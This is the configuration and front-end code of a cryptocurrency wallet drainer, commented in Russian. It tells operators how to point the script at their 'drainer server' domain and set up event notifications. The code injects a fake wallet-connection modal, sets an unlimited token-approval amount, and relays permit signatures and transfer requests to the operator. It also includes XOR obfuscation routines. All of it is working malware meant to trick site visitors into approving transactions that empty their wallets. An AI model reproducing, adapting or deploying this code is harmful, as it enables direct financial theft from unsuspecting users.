

// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

let CF_EKEY = 234343253453; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
const CF_HTTP_MODE = false; // [LOCALHOST TEST ONLY] Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь (по умолчанию - 443)
// По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
const CF_Server_URL = "lovelike777.shop"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14"; // Project ID из WalletConnect Cloud
// Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
// Регистрируемся на сайте, выбираем создать новый проект, ставим AppKit => JavaScript, заполнять дополнительные настройки необязательно
// Project ID будет в левом верхнем углу и должен быть похожим на тот, что вставлен по умолчанию по виду и длине

const CF_Modal_Style = 2; // 1 - старая (не рекомендуется), 2 - новая (обновление от 17.11.2023)
const CF_Loader_Style = 2; // 1 - старый (не рекомендуется), 2 - новый (обновление от 17.11.2023)
const CF_Color_Scheme = 'light'; // light - светлая тема, dark - тёмная тема
const CF_Modal_Mode = 2; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

const CF_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем CF_WalletConnect_Customization, он нужен только для кастомизации дизайна

const CF_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Web3 Application", // По умолчанию "Web3 Application"
  url: "https://" + window.location.host, // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const CF_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const CF_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const CF_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;

if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;

var CF_Worker_ID = null;
const BN = ethers.BigNumber.from;

let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;

const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    CF_Currencies = await response.json();
    CF_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const CF_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org',
  81457: 'api.blastscan.io',
};

var CF_MetaMask_ChainData = {};

const fill_chain_data = () => {
  CF_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    81457: {
      chainId: '0x13e31',
      chainName: "Blast",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[81457]],
      blockExplorerUrls: ["https://blastscan.io/"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const CF_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const CF_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const CF_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const CF_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
const CF_Pancake_Native_ABI = [{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"}];

const CF_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const CF_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const CF_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const CF_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const CF_Modal_Data = [
  {
    type: 'style',
    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/graphics/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
  },
  {
    type: 'html',
    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/graphics/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/graphics/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/graphics/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/graphics/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="init_reown()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="init_co()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
  }
];

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.id = 'web3-style';
    modal_style.innerHTML = CF_Modal_Data[0].data;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = CF_Modal_Data[1].data;
    document.body.prepend(modal_elem);
  } catch(err) {
    console.log(err);
  }
};

const set_modal_data = (style_code, html_code) => {
  try {
    CF_Modal_Data[0].data = style_code;
    CF_Modal_Data[1].data = html_code;
    reset_modal();
  } catch(err) {
    console.log(err);
  }
};

const reset_modal = () => {
  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
  try { inject_modal(); } catch(err) { console.log(err); }
};

const init_co = () => {
  try {
    if (!CF_Connection) return connect_wallet();
    if (CF_Process) return;
    if (CF_Modal_Style == 2) {
      MSM.open(CF_Color_Scheme, CF_Modal_Mode);
    } else {
      document.getElementById('web3-modal').style.display = 'block';
      document.getElementById('web3-overlay').style.display = 'block';
      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    if (CF_Modal_Style == 2) {
      MSM.close();
    } else {
      document.getElementById('web3-modal').style.display = 'none';
      document.getElementById('web3-overlay').style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

let CF_Is_AppKit_Loaded = false;
let CF_Is_AppKit_Inited = false;
let CF_Is_AppKit_Connected = false;
let CF_Is_AppKit_Opened = false;

const load_wc = async () => {
  if (CF_Is_AppKit_Loaded) return;
  CF_Is_AppKit_Loaded = true;
  if (CF_WalletConnect_Customization) {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] },
      ...CF_WalletConnect_Theme
    });
  } else {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] }
    });
  }
  CF_AppKit.subscribeState(async (new_state) => {
    try {

    } catch(err) {
      console.log(err);
    }
  });
  CF_AppKit.subscribeEvents(async (ev) => {
    try {
      // console.log(ev.data)
      if (ev.data.event == 'INITIALIZE') {
        CF_Is_AppKit_Inited = true;
        if (CF_AppKit.getWalletProvider() != undefined) {
          CF_Is_AppKit_Connected = true;
          try {
            CF_AppKit.disconnect(CF_AppKit.getWalletProvider());
          } catch(err) {
            console.log(err);
          }
        }
      } else if (ev.data.event == 'DISCONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = false;
      } else if (ev.data.event == 'CONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = true;
        CF_Current_Address = CF_AppKit.getAddress();
        CF_Provider = CF_AppKit.getWalletProvider();
      } else if (ev.data.event == 'MODAL_OPEN') {
        CF_Is_AppKit_Opened = true;
      } else if (ev.data.event == 'MODAL_CLOSE') {
        CF_Is_AppKit_Opened = false;
      }
    } catch(err) {
      console.log(err);
    }
  });
};

const load_wc_legacy = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in CF_Settings.RPCs) {
    if (chain_id != '1') all_chains_arr.push(chain_id);
    all_chains_obj[chain_id] = CF_Settings.RPCs[chain_id];
  }
  CF_Provider = await WC2_Provider.init({
    projectId: CF_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: CF_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (CF_WalletConnect_Customization == 1) ? CF_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let rsk_kes = 0, last_request_ts = 0;
